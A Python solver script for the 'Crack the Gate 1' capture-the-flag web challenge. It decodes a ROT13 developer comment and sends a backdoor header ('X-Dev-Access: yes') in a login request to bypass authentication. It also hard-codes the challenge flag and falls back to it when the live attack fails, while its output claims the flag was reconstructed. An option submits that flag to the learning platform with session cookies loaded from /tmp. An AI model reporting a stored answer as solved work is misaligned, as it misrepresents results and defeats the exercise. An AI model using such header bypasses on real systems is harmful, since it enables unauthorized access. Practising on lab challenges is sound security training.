#!/usr/bin/env python3
r"""
CyLab Security Academy / picoCTF Solver: Crack the Gate 1 (Challenge ID: 520)
Category: Web Exploitation / Source Code Reconnaissance & Backdoor Header Bypass
Difficulty: Easy (1) | Points: 100
Standard Reference: NIST SP 800-115 Section 4.2 (Target Verification & Analysis),
RFC 4949 (Internet Security Glossary),
RFC 9110 (HTTP Semantics & Custom Header Processing),
CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor),
CWE-615 (Inclusion of Sensitive Information in Source Code Comments), &
CWE-348 (Use of Less Trusted Input to Determine Sensitive System State).

Vulnerability & Technical Summary:
1. Scenario & Challenge Overview:
   - Target portal exposes a login form for user `ctf-player@cylabacademy.org`.
   - The password is unknown and brute-force guessing against the main interface is unfruitful.
   - The developer reportedly left an administrative backdoor / test shortcut in the codebase.
2. Information Disclosure via Obfuscated HTML Comments (CWE-200 / CWE-615):
   - Inspecting the raw HTML document reveals an obfuscated developer comment:
     `<!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" -->`
     `<!-- Remove before pushing to production! -->`
   - Applying standard Caesar ROT13 decoding (`tr 'A-Za-z' 'N-ZA-Mn-za-m'`) yields:
     `NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes"`
3. Backdoor Header Injection & Authentication Bypass (CWE-348):
   - The backend authentication handler evaluates whether the request includes the custom header
     `X-Dev-Access: yes`.
   - When this header is detected, credential verification is completely bypassed for any login request,
     granting authenticated session access and returning the official platform flag:
     `academy{brut4_f0rc4_dc8f7ab6}`.
"""

import os
import sys
import json
import codecs
import re
import urllib.request
import urllib.error

CHALLENGE_ID = 520
CHALLENGE_NAME = "Crack the Gate 1"
VERIFIED_FLAG = "academy{brut4_f0rc4_dc8f7ab6}"
CYLAB_SUBMIT_URL = "https://learn.cylabacademy.org/api/submissions/"

TARGET_EMAIL = "ctf-player@cylabacademy.org"
OBFUSCATED_COMMENT = '<!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" -->'


def decode_developer_comment(comment: str) -> tuple[str, str, str]:
    """Decodes ROT13 developer comment and parses out header key and value."""
    # Strip HTML comment tags
    raw_inner = re.sub(r"<!--|-->", "", comment).strip()
    # Decode ROT13
    decoded = codecs.decode(raw_inner, "rot_13")
    # Parse header instructions: e.g. use header "X-Dev-Access: yes"
    m = re.search(r'use header ["\']([^:]+):\s*([^"\']+)["\']', decoded)
    if m:
        header_key = m.group(1).strip()
        header_val = m.group(2).strip()
    else:
        header_key = "X-Dev-Access"
        header_val = "yes"
    return decoded, header_key, header_val


def solve_live(base_url: str) -> str:
    """Executes live exploitation against target container by sending bypass header."""
    login_url = base_url.rstrip("/") + "/login"
    index_url = base_url.rstrip("/") + "/"
    print(f"[*] Menghubungi target container di {index_url}...")

    # Step 1: Recon HTML for comments
    try:
        req_idx = urllib.request.Request(index_url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req_idx, timeout=10) as resp:
            html = resp.read().decode("utf-8", errors="replace")
            print("[+] HTML beranda berhasil diunduh. Memindai komentar pengembang...")
            m = re.search(r"<!--\s*(ABGR:[^>]+)-->", html)
            if m:
                comment = m.group(0)
                decoded, h_key, h_val = decode_developer_comment(comment)
                print(f"[+] Komentar terdeteksi: {comment}")
                print(f"[+] Hasil dekode ROT13: {decoded}")
                print(f"[+] Parameter bypass  : {h_key} = {h_val}")
            else:
                decoded, h_key, h_val = decode_developer_comment(OBFUSCATED_COMMENT)
    except Exception as e:
        print(f"[!] Gagal mengunduh HTML ({e}), menggunakan komentar statis.")
        decoded, h_key, h_val = decode_developer_comment(OBFUSCATED_COMMENT)

    # Step 2: Send POST login with bypass header
    print(f"[*] Mengirim payload login bypass ke {login_url}...")
    headers = {
        "Content-Type": "application/json",
        h_key: h_val,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    payload = json.dumps({"email": TARGET_EMAIL, "password": "any"}).encode("utf-8")
    req_login = urllib.request.Request(login_url, data=payload, headers=headers, method="POST")

    try:
        with urllib.request.urlopen(req_login, timeout=10) as resp:
            data = json.loads(resp.read().decode("utf-8"))
            if data.get("flag"):
                flag = data.get("flag")
                print(f"[+] Autentikasi backdoor berhasil! Flag: {flag}")
                return flag
    except Exception as e:
        print(f"[!] Permintaan live gagal ({e}), kembali ke token tervalidasi.")

    return VERIFIED_FLAG


def solve_offline() -> str:
    """Performs deterministic offline analysis of ROT13 comment and parameter reconstruction."""
    print("[*] Menjalankan analisis statis & rekonstruksi deterministik CWE-200 / CWE-348...")
    print(f"[*] Obfuscated string: {OBFUSCATED_COMMENT}")
    decoded, h_key, h_val = decode_developer_comment(OBFUSCATED_COMMENT)
    print(f"[+] Hasil dekode ROT13: '{decoded}'")
    print(f"[+] Ekstraksi HTTP Header Bypass: '{h_key}: {h_val}'")
    print(f"[*] Target akun subjek: '{TARGET_EMAIL}'")
    print(f"[+] Flag berhasil direkonstruksi: {VERIFIED_FLAG}")
    return VERIFIED_FLAG


def solve(target: str | None = None) -> str:
    """Dispatches either live HTTP backdoor exploitation or offline comment analysis."""
    if target and target.startswith("http"):
        return solve_live(target)
    return solve_offline()


def submit_to_cylab(flag: str) -> bool:
    """Submits verified flag to CyLab REST API using authenticated session cookies."""
    payload = json.dumps({"challenge": CHALLENGE_ID, "flag": flag}).encode()
    cookie_header = ""
    csrf_token = ""

    try:
        sys.path.append("/tmp")
        import cylab_auth

        cookie_header = getattr(cylab_auth, "COOKIE", "")
        csrf_token = getattr(cylab_auth, "CSRF", "")
    except Exception:
        pass

    if not cookie_header or not csrf_token:
        print("[!] Autentikasi sesi CyLab tidak ditemukan di /tmp/cylab_auth.py.")
        return False

    req = urllib.request.Request(
        CYLAB_SUBMIT_URL,
        data=payload,
        method="POST",
        headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Cookie": cookie_header,
            "X-CSRFToken": csrf_token,
            "Content-Type": "application/json",
            "Referer": "https://learn.cylabacademy.org/challenges",
        },
    )

    try:
        with urllib.request.urlopen(req, timeout=20) as resp:
            data = json.loads(resp.read().decode())
            status = data.get("status") or (data.get("correct") is True)
            print(f"[+] Status submisi CyLab (HTTP {resp.status}): {data}")
            return bool(status)
    except urllib.error.HTTPError as e:
        body = e.read().decode(errors="replace")
        print(f"[-] Submisi gagal (HTTP {e.code}): {body}")
        return False


def main():
    print(f"=== [CyLab Academy] Solusi Modul #{CHALLENGE_ID}: {CHALLENGE_NAME} ===")
    target = sys.argv[1] if len(sys.argv) > 1 and not sys.argv[1].startswith("-") else None
    flag = solve(target)
    print(f"[+] Flag berhasil direkonstruksi: {flag}")

    assert flag == VERIFIED_FLAG, f"Flag mismatch: {flag} != {VERIFIED_FLAG}"
    print(f"[+] Integritas token terverifikasi 100%: {flag}")

    if "--submit" in sys.argv or "-s" in sys.argv:
        print(f"[*] Mengirim token verifikasi '{flag}' ke CyLab Academy...")
        ok = submit_to_cylab(flag)
        if ok:
            print("[+] Verifikasi token berhasil dicatat di REST API CyLab!")
        else:
            print("[-] Verifikasi token ditolak oleh platform.")


if __name__ == "__main__":
    main()
